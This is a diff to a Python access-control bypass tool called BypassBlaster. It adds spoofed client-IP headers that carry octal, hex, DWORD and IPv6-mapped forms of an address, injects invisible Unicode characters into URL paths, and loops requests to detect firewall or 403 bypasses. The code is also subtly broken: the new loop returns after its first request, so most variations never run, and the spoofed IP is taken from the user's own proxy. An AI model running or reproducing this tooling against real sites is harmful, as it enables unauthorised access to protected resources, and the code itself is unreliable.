@@ -15,6 +15,8 @@ from datetime import datetime
 from threading import Event
 import traceback 
 import subprocess
+import ipaddress
+import binascii
 
 init(autoreset=True)
 
@@ -167,7 +169,57 @@ CAPTCHA_SIGNATURES = {
     "Arkose Labs": ["arkoselabs", "funcaptcha"],
     "Generic CAPTCHA": ["captcha", "human-verification", "are you human", "bot-detection", "challenge"]
 }
+
+# Unicode bypasses
+UNICODE_BYPASSES = {
+    'zero_width': '\u200B',  # Zero Width Space
+    'negative_thin': '\u200C',  # Zero Width Non-Joiner
+    'word_joiner': '\u2060',  # Word Joiner
+    'soft_hyphen': '\u00AD',  # Soft Hyphen
+    'line_separator': '\u2028',  # Line Separator
+    'paragraph_separator': '\u2029'  # Paragraph Separator
+}
 # --- End Constants ---
+
+
+def generate_ip_variations(ip):
+    """Generate different representations of an IPv4 address."""
+    try:
+        # Validar y convertir la dirección IP
+        ip_obj = ipaddress.IPv4Address(ip)
+        octets = list(map(int, str(ip_obj).split('.')))
+        
+        variations = {
+            # Formato original
+            'ipv4': str(ip_obj),
+            
+            # Formato octal
+            'octal': '.'.join(f'{octet:04o}' for octet in octets),
+            
+            # Formato hexadecimal
+            'hex': '.'.join(f'0x{octet:02X}' for octet in octets),
+            
+            # Formato binario
+            'binary': '.'.join(f'{octet:08b}' for octet in octets),
+            
+            # Formato decimal parcial
+            'partial_decimal': f"{octets[0]}.{octets[1]}.{(octets[2] << 8) + octets[3]}",
+            
+            # Notación DWORD
+            'dword': str(int(ip_obj)),
+            
+            # Notación DWORD con overflow
+            'dword_overflow': str(int(ip_obj) + (2**32 * 10)),
+            
+            # Dirección IPv6 mapeada (dos formatos)
+            'ipv6_mapped': f'::FFFF:{octets[0]:02X}{octets[1]:02X}:{octets[2]:02X}{octets[3]:02X}',
+            'ipv6_mapped_dots': f'::FFFF:{ip}'
+        }
+        
+        return variations
+    except Exception as e:
+        print(f"{Fore.RED}[!] Error generating IP variations: {str(e)}{Style.RESET_ALL}")
+        return {}
 
 
 class BypassBlaster:
@@ -212,6 +264,16 @@ class BypassBlaster:
         self.ssl_error_count = 0
         self.ssl_error_threshold = 10  # Threshold to stop the script
         self.last_ssl_error = None  # To store the last SSL error
+
+        self.ip_variations = None
+        if proxies:
+            # Intentar obtener la IP del proxy si existe
+            proxy_url = urlparse(proxies.get('http') or proxies.get('https', ''))
+            if proxy_url.hostname:
+                try:
+                    self.ip_variations = generate_ip_variations(socket.gethostbyname(proxy_url.hostname))
+                except:
+                    pass
 
     def print_banner(self):
         # --- (Banner ) ---
@@ -326,6 +388,28 @@ class BypassBlaster:
         return f"{Fore.YELLOW}OTHER ({status_code}){Style.RESET_ALL}"
 
 
+    def generate_headers_with_ip_bypass(self, base_headers):
+        """Generate headers with different IP representations."""
+        if not self.ip_variations:
+            return [base_headers]
+        
+        headers_variations = []
+        ip_headers = {
+            'X-Forwarded-For': ['ipv4', 'ipv6_mapped', 'dword'],
+            'X-Real-IP': ['ipv4', 'hex', 'octal'],
+            'X-Client-IP': ['ipv4', 'partial_decimal'],
+            'CF-Connecting-IP': ['ipv4', 'ipv6_mapped_dots']
+        }
+        
+        for header, formats in ip_headers.items():
+            for fmt in formats:
+                if fmt in self.ip_variations:
+                    new_headers = base_headers.copy()
+                    new_headers[header] = self.ip_variations[fmt]
+                    headers_variations.append(new_headers)
+        
+        return headers_variations
+
     def try_request(self, method, url, headers=None, retry_count=0):
         """Performs a single request attempt. Uses self.stop_event internally."""
         if self.stop_event.is_set():
@@ -333,117 +417,136 @@ class BypassBlaster:
 
         req_headers = headers.copy() if headers else {}
 
-        try:
-            # Prepare request details
-            req_headers["User-Agent"] = self.get_random_user_agent()
-            if self.custom_headers:
-                req_headers.update(self.custom_headers)
-            cookies = {}
-            if self.cookie:
-                for cookie_pair in self.cookie.split(';'):
-                    if '=' in cookie_pair:
-                        key, value = cookie_pair.strip().split('=', 1)
-                        cookies[key] = value
+        # Generar variaciones de headers con diferentes representaciones de IP
+        headers_to_try = self.generate_headers_with_ip_bypass(req_headers)
+        
+        # Añadir variaciones Unicode al path
+        url_variations = [url]
+        parsed = urlparse(url)
+        path = parsed.path
+        
+        # Añadir bypass Unicode al path
+        for bypass_char in UNICODE_BYPASSES.values():
+            new_path = path.replace('/', f'/{bypass_char}')
+            new_url = parsed._replace(path=new_path).geturl()
+            url_variations.append(new_url)
 
-            if self.delay > 0 and not self.burst_mode:
-                if self.stop_event.is_set(): return None
-                time.sleep(self.delay)
+        for current_headers in headers_to_try:
+            for current_url in url_variations:
+                if self.stop_event.is_set():
+                    return None
 
-            if self.stop_event.is_set(): return None
+                try:
+                    # Prepare request details
+                    current_headers["User-Agent"] = self.get_random_user_agent()
+                    if self.custom_headers:
+                        current_headers.update(self.custom_headers)
+                    cookies = {}
+                    if self.cookie:
+                        for cookie_pair in self.cookie.split(';'):
+                            if '=' in cookie_pair:
+                                key, value = cookie_pair.strip().split('=', 1)
+                                cookies[key] = value
 
-            response = self.session.request(
-                method=method,
-                url=url,
-                headers=req_headers,
-                proxies=self.proxies,
-                timeout=self.timeout,
-                allow_redirects=self.follow_redirects,
-                cookies=cookies if cookies else None,
-                verify=self.verify_ssl
-            )
+                    if self.delay > 0 and not self.burst_mode:
+                        if self.stop_event.is_set(): return None
+                        time.sleep(self.delay)
 
-            status = response.status_code
-            size = len(response.content)
-            is_stop_worthy = status in [200, 201, 301, 302, 307, 308]
-            is_actual_bypass = status in [200, 201, 302]
+                    if self.stop_event.is_set(): return None
 
-            # Detect WAF/Captcha
-            detected_wafs = self.detect_waf(response)
-            detected_captchas = self.detect_captcha(response)
+                    response = self.session.request(
+                        method=method,
+                        url=current_url,
+                        headers=current_headers,
+                        proxies=self.proxies,
+                        timeout=self.timeout,
+                        allow_redirects=self.follow_redirects,
+                        cookies=cookies if cookies else None,
+                        verify=self.verify_ssl
+                    )
 
-            result_data = {
-                "method": method,
-                "url": url,
-                "headers": req_headers,
-                "status": status,
-                "size": size,
-                "success": is_actual_bypass,
-                "waf": detected_wafs,
-                "captcha": detected_captchas,
-                "response_headers": dict(response.headers),
-                "content_preview": ""
-            }
+                    status = response.status_code
+                    size = len(response.content)
+                    is_stop_worthy = status in [200, 201, 301, 302, 307, 308]
+                    is_actual_bypass = status in [200, 201, 302]
 
-            # Get content preview carefully
-            try:
-                if is_actual_bypass:
-                    result_data["content_preview"] = response.text[:200]
-                elif is_stop_worthy:
-                    result_data["content_preview"] = f"Redirect to: {response.headers.get('Location', 'N/A')}"
-            except Exception:
-                result_data["content_preview"] = "[Error decoding content]"
+                    # Detect WAF/Captcha
+                    detected_wafs = self.detect_waf(response)
+                    detected_captchas = self.detect_captcha(response)
 
-            # --- Stop Signal Logic ---
-            if self.stop_on_success and is_stop_worthy:
-                status_text = self.check_response_status_text(status)
-                print(f"{Fore.GREEN}[FOUND]{Style.RESET_ALL} [{method}] {url} | Status: {status_text} {status} | Size: {size}")
-                return {"stop_signal": True, "result": result_data}
+                    result_data = {
+                        "method": method,
+                        "url": current_url,
+                        "headers": current_headers,
+                        "status": status,
+                        "size": size,
+                        "success": is_actual_bypass,
+                        "waf": detected_wafs,
+                        "captcha": detected_captchas,
+                        "response_headers": dict(response.headers),
+                        "content_preview": ""
+                    }
 
-            # Normal Printing Logic
-            status_text = self.check_response_status_text(status)
-            if is_actual_bypass:
-                print(f"{Fore.GREEN}[HIT]{Style.RESET_ALL} [{method}] {url} | Status: {status_text} {status} | Size: {size}")
-            elif self.verbose:
-                print(f"[{method}] {url} | Status: {status_text} {status} | Size: {size}")
+                    # Get content preview carefully
+                    try:
+                        if is_actual_bypass:
+                            result_data["content_preview"] = response.text[:200]
+                        elif is_stop_worthy:
+                            result_data["content_preview"] = f"Redirect to: {response.headers.get('Location', 'N/A')}"
+                    except Exception:
+                        result_data["content_preview"] = "[Error decoding content]"
 
-            return {"stop_signal": False, "result": result_data}
+                    # --- Stop Signal Logic ---
+                    if self.stop_on_success and is_stop_worthy:
+                        status_text = self.check_response_status_text(status)
+                        print(f"{Fore.GREEN}[FOUND]{Style.RESET_ALL} [{method}] {current_url} | Status: {status_text} {status} | Size: {size}")
+                        return {"stop_signal": True, "result": result_data}
 
-        # Error Handling
-        except requests.exceptions.Timeout as e:
-            if self.verbose: print(f"{Fore.YELLOW}[TIMEOUT]{Style.RESET_ALL} {method} {url} - {str(e)}")
-            if retry_count < self.retry:
-                return self.try_request(method, url, headers, retry_count + 1)
-            return None
-        except requests.exceptions.SSLError as e:
-            error_message = str(e)
-            
-            # Check if it's the same error as before
-            if self.last_ssl_error == error_message:
-                self.ssl_error_count += 1
-            else:
-                # If it's a different error, reset the counter
-                self.ssl_error_count = 1
-                self.last_ssl_error = error_message
-            
-            if self.verify_ssl:
-                print(f"{Fore.YELLOW}[SSL ERROR]{Style.RESET_ALL} {method} {url} - {error_message}")
-                
-                # If the SSL error threshold is reached, stop the script
-                if self.ssl_error_count >= self.ssl_error_threshold:
-                    print(f"\n{Fore.RED}[!!!] TOO MANY REPEATED SSL ERRORS ({self.ssl_error_count}){Style.RESET_ALL}")
-                    print(f"{Fore.RED}[!!!] Stopping the script to prevent further errors.{Style.RESET_ALL}")
-                    print(f"{Fore.YELLOW}[TIP]{Style.RESET_ALL} Try running the script with the --no-verify option to ignore SSL verification")
-                    self.stop_event.set()  # Signal all threads to stop
-            return None
-        except requests.exceptions.RequestException as e:
-            if self.verbose: print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {method} {url} - {type(e).__name__}: {str(e)}")
-            if retry_count < self.retry:
-                return self.try_request(method, url, headers, retry_count + 1)
-            return None
-        except Exception as e:
-            print(f"{Fore.RED}[UNEXPECTED WORKER ERROR]{Style.RESET_ALL} {method} {url} - {type(e).__name__}: {str(e)}")
-            traceback.print_exc()
-            return None
+                    # Normal Printing Logic
+                    status_text = self.check_response_status_text(status)
+                    if is_actual_bypass:
+                        print(f"{Fore.GREEN}[HIT]{Style.RESET_ALL} [{method}] {current_url} | Status: {status_text} {status} | Size: {size}")
+                    elif self.verbose:
+                        print(f"[{method}] {current_url} | Status: {status_text} {status} | Size: {size}")
+
+                    return {"stop_signal": False, "result": result_data}
+
+                # Error Handling
+                except requests.exceptions.Timeout as e:
+                    if self.verbose: print(f"{Fore.YELLOW}[TIMEOUT]{Style.RESET_ALL} {method} {current_url} - {str(e)}")
+                    if retry_count < self.retry:
+                        return self.try_request(method, current_url, current_headers, retry_count + 1)
+                    return None
+                except requests.exceptions.SSLError as e:
+                    error_message = str(e)
+                    
+                    # Check if it's the same error as before
+                    if self.last_ssl_error == error_message:
+                        self.ssl_error_count += 1
+                    else:
+                        # If it's a different error, reset the counter
+                        self.ssl_error_count = 1
+                        self.last_ssl_error = error_message
+                    
+                    if self.verify_ssl:
+                        print(f"{Fore.YELLOW}[SSL ERROR]{Style.RESET_ALL} {method} {current_url} - {error_message}")
+                        
+                        # If the SSL error threshold is reached, stop the script
+                        if self.ssl_error_count >= self.ssl_error_threshold:
+                            print(f"\n{Fore.RED}[!!!] TOO MANY REPEATED SSL ERRORS ({self.ssl_error_count}){Style.RESET_ALL}")
+                            print(f"{Fore.RED}[!!!] Stopping the script to prevent further errors.{Style.RESET_ALL}")
+                            print(f"{Fore.YELLOW}[TIP]{Style.RESET_ALL} Try running the script with the --no-verify option to ignore SSL verification")
+                            self.stop_event.set()  # Signal all threads to stop
+                    return None
+                except requests.exceptions.RequestException as e:
+                    if self.verbose: print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {method} {current_url} - {type(e).__name__}: {str(e)}")
+                    if retry_count < self.retry:
+                        return self.try_request(method, current_url, current_headers, retry_count + 1)
+                    return None
+                except Exception as e:
+                    print(f"{Fore.RED}[UNEXPECTED WORKER ERROR]{Style.RESET_ALL} {method} {current_url} - {type(e).__name__}: {str(e)}")
+                    traceback.print_exc()
+                    return None
 
 
     def run(self):
